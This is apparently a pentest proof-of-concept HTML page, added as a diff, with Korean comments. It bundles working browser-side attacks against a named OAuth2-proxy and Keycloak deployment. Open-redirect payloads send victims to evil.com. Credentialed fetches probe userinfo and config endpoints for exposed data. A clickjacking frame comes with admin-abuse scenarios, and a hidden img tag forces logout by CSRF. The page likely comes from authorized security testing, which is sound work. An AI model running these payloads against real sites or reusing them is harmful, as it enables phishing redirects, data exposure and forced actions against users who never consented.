@@ -1,0 +1,212 @@
+<!DOCTYPE html>
+<html lang="ko">
+<head>
+  <meta charset="UTF-8">
+  <title>Open Redirect PoC</title>
+  <style>
+    body { font-family: monospace; background: #1a1a2e; color: #eee; padding: 20px; }
+    h1 { color: #e94560; font-size: 18px; }
+    .card { background: #16213e; border: 1px solid #0f3460; border-radius: 8px; padding: 16px; margin: 12px 0; }
+    pre { white-space: pre-wrap; word-break: break-all; font-size: 12px; line-height: 1.6; }
+    .danger { color: #e94560; font-weight: bold; }
+    .safe { color: #4ecca3; }
+    .value { color: #0ff; }
+    button { background: #e94560; color: #fff; border: none; padding: 10px 20px; border-radius: 4px; cursor: pointer; font-size: 14px; margin: 4px; }
+    input { background: #0f3460; color: #fff; border: 1px solid #333; padding: 8px 12px; border-radius: 4px; width: 450px; font-family: monospace; }
+    #statusBar { padding: 12px; margin: 12px 0; border-radius: 4px; background: #0f3460; font-size: 14px; }
+    a { color: #0ff; }
+  </style>
+</head>
+<body>
+  <h1>Vulnerability Test Suite</h1>
+
+  <div style="margin: 16px 0">
+    <label>Target:</label><br>
+    <input id="target" type="text" value="https://nexus.clouddev.dev.genians.kr" />
+  </div>
+
+  <div style="margin: 16px 0">
+    <button onclick="testOpenRedirect()">1. Open Redirect</button>
+    <button onclick="testInfoDisclosure()">2. Info Disclosure</button>
+    <button onclick="testClickjacking()">3. Clickjacking</button>
+    <button onclick="testLogoutCSRF()">4. Logout CSRF</button>
+  </div>
+
+  <div id="statusBar">Ready</div>
+  <div id="resultsArea"></div>
+
+<script>
+var resultsArea = document.getElementById('resultsArea');
+var statusBar = document.getElementById('statusBar');
+
+function getTarget() {
+  return document.getElementById('target').value.replace(/\/$/,'');
+}
+
+function addCard(title, cls, content) {
+  var d = document.createElement('div');
+  d.className = 'card ' + cls;
+  d.innerHTML = '<b>' + title + '</b><pre>' + content + '</pre>';
+  resultsArea.appendChild(d);
+}
+
+function setStatus(msg, color) {
+  statusBar.style.background = color || '#0f3460';
+  statusBar.textContent = msg;
+}
+
+// ============================================
+// 1. Open Redirect via OAuth2 Proxy
+// ============================================
+async function testOpenRedirect() {
+  resultsArea.innerHTML = '';
+  var target = getTarget();
+  setStatus('Testing Open Redirect...');
+
+  var payloads = [
+    'https://evil.com',
+    '//evil.com',
+    'https://evil.com%00@' + new URL(target).hostname,
+    '///evil.com',
+    '/\\evil.com',
+  ];
+
+  for (var i = 0; i < payloads.length; i++) {
+    var rd = payloads[i];
+    var url = target + '/oauth2/start?rd=' + encodeURIComponent(rd);
+    try {
+      var res = await fetch(url, { redirect: 'manual', credentials: 'include' });
+      var location = res.headers.get('location') || '(no location header)';
+
+      // opaqueredirect이면 redirect가 발생한 것
+      if (res.type === 'opaqueredirect' || res.status === 302 || res.status === 301) {
+        // fetch redirect:manual에서는 location을 읽을 수 없는 경우가 많음
+        addCard('Payload: ' + rd, 'card',
+          '<span class="label">Status:</span> <span class="value">' + res.status + ' (redirect)</span>\n' +
+          '<span class="label">Type:</span> <span class="value">' + res.type + '</span>\n' +
+          '<span class="label">URL:</span> <a href="' + url + '" target="_blank">' + url + '</a>\n' +
+          '위 링크를 새 탭에서 클릭하여 어디로 리다이렉트되는지 확인하세요.'
+        );
+      } else {
+        addCard('Payload: ' + rd, 'card',
+          '<span class="label">Status:</span> <span class="value">' + res.status + '</span>\n' +
+          '<span class="safe">리다이렉트 없음</span>'
+        );
+      }
+    } catch (e) {
+      addCard('Payload: ' + rd, 'card',
+        '<span class="value">' + e.message + '</span>\n' +
+        '<a href="' + url + '" target="_blank">수동으로 테스트</a>'
+      );
+    }
+  }
+
+  setStatus('Open Redirect 테스트 완료 — 위 링크를 클릭하여 수동 확인 필요');
+}
+
+// ============================================
+// 2. Information Disclosure
+// ============================================
+async function testInfoDisclosure() {
+  resultsArea.innerHTML = '';
+  var target = getTarget();
+  setStatus('Testing Information Disclosure...');
+
+  var endpoints = [
+    { path: '/realms/gnportal/.well-known/openid-configuration', name: 'Keycloak OIDC Config' },
+    { path: '/api/health', name: 'BFF Health' },
+    { path: '/oauth2/userinfo', name: 'OAuth2 UserInfo' },
+  ];
+
+  for (var i = 0; i < endpoints.length; i++) {
+    var ep = endpoints[i];
+    try {
+      var res = await fetch(target + ep.path, { credentials: 'include' });
+      var text = await res.text();
+      var isJson = false;
+      try { JSON.parse(text); isJson = true; } catch(e) {}
+
+      if (res.ok && text.length > 2) {
+        addCard(ep.name + ' (' + ep.path + ')', 'card',
+          '<span class="danger">[EXPOSED] Status: ' + res.status + '</span>\n' +
+          '<span class="value">' + (isJson ? JSON.stringify(JSON.parse(text),null,2) : text).substring(0, 1000) + '</span>'
+        );
+      } else {
+        addCard(ep.name, 'card',
+          '<span class="safe">[' + res.status + '] 접근 불가 또는 빈 응답</span>'
+        );
+      }
+    } catch (e) {
+      addCard(ep.name, 'card', '<span class="safe">[BLOCKED] ' + e.message + '</span>');
+    }
+  }
+
+  setStatus('Info Disclosure 테스트 완료');
+}
+
+// ============================================
+// 3. Clickjacking (X-Frame-Options 확인)
+// ============================================
+function testClickjacking() {
+  resultsArea.innerHTML = '';
+  var target = getTarget();
+  setStatus('Testing Clickjacking...');
+
+  var iframe = document.createElement('iframe');
+  iframe.src = target;
+  iframe.style.cssText = 'width:100%;height:400px;border:2px solid #e94560;border-radius:8px;margin:12px 0;';
+
+  iframe.onload = function() {
+    addCard('Clickjacking Test', 'card',
+      '<span class="danger">[VULNERABLE] Shell이 iframe에 로드됨!</span>\n' +
+      'X-Frame-Options 또는 CSP frame-ancestors가 설정되지 않았습니다.\n\n' +
+      '공격 시나리오:\n' +
+      '- 투명 iframe 위에 가짜 UI를 덮어서 사용자 클릭 유도\n' +
+      '- "보안 설정 확인" 버튼 → 실제로는 Shell에서 관리 기능 실행\n' +
+      '- admin이 모르게 테넌트 삭제, 메뉴 변경 등 수행 가능'
+    );
+    setStatus('VULNERABLE — Clickjacking 가능', '#e94560');
+  };
+
+  iframe.onerror = function() {
+    addCard('Clickjacking Test', 'card',
+      '<span class="safe">[SAFE] iframe 로드 차단됨</span>'
+    );
+    setStatus('SAFE — X-Frame-Options가 올바르게 설정됨', '#4ecca3');
+  };
+
+  // X-Frame-Options 차단 시 콘솔 에러 감지
+  var timer = setTimeout(function() {
+    addCard('Clickjacking Test', 'card',
+      '<span class="value">iframe이 로드되었지만 내용 확인 불가 (cross-origin)\n' +
+      '아래 iframe을 확인하세요 — Shell 화면이 보이면 취약합니다.</span>'
+    );
+    setStatus('아래 iframe 확인 — Shell이 보이면 VULNERABLE');
+  }, 5000);
+
+  resultsArea.appendChild(iframe);
+}
+
+// ============================================
+// 4. Logout CSRF
+// ============================================
+function testLogoutCSRF() {
+  resultsArea.innerHTML = '';
+  var target = getTarget();
+  setStatus('Testing Logout CSRF...');
+
+  addCard('Logout CSRF', 'card',
+    '아래 링크를 <b>로그인된 사용자에게</b> 보내면 강제 로그아웃됩니다:\n\n' +
+    '<a href="' + target + '/oauth2/sign_out" target="_blank">' + target + '/oauth2/sign_out</a>\n\n' +
+    '또는 이미지 태그로 숨길 수 있습니다:\n' +
+    '<span class="value">&lt;img src="' + target + '/oauth2/sign_out" style="display:none"&gt;</span>\n\n' +
+    '이 페이지에 위 이미지를 삽입하면 방문자가 자동으로 로그아웃됩니다.\n' +
+    'CSRF 토큰 검증이 없으면 취약합니다.'
+  );
+
+  // 실제로 sign_out 호출하진 않음 (사용자 세션 보호)
+  setStatus('Logout CSRF — 위 링크로 수동 테스트 (현재 세션에 영향 없음)');
+}
+</script>
+</body>
+</html>
